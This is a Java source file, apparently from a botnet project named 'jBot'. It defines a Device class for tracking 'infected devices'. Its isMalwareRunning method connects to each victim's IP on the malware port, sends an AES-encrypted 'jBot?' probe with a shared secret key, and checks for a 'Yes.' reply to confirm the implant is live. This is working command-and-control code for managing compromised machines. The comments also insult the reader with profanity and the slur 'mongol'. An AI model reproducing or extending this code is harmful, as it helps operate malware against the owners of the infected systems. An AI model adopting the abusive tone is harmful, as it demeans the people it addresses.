package me.aaronakhtar.jbot.objects;

import me.aaronakhtar.jbot.Options;
import me.aaronakhtar.jbot.crypto.Aes;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;

public class Device { // this is the class I am going to use as a object for infected devices you mongol...

    private InetAddress inetAddress;

    /**
     * @param inetAddress the ip address of the infected device
     * */
    public Device(InetAddress inetAddress) {
        this.inetAddress = inetAddress;
    }

    /**
     * @return what the fuck does you dumb ass think this returns, jesus fucking christ....
     * */
    public InetAddress getInetAddress() {
        return inetAddress;
    }

    /**
     * @return returns a boolean value depending on whether the malware is running...
     * */
    public boolean isMalwareRunning(){
        try{
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(inetAddress, Options.malware_port), 3000);
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
            writer.println(Aes.encrypt("jBot?", Options.secret_key)); //if running malware should return "Yes."
            writer.flush();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String returned = bufferedReader.readLine();
            if (returned != null){
                if (Aes.decrypt(returned, Options.secret_key).equalsIgnoreCase("Yes.")){
                    return true;
                }
            }else{
                return false;
            }
            bufferedReader.close();
            writer.close();
            socket.close();
        }catch (Exception e){}
        return false;
    }

}
